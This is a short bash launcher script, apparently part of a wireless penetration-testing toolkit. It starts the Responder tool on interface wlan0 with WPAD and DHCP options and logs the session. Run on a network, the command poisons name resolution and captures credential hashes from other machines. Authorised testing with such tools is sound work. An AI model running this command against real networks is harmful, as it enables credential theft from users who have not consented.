#!/bin/bash
# Dependencies: responder
# Silent: true
# Logfile: /usr/share/responder/logs/Responder-Session.log
# Follow_log: true

echo "Responder script started"
responder -I wlan0 -wd
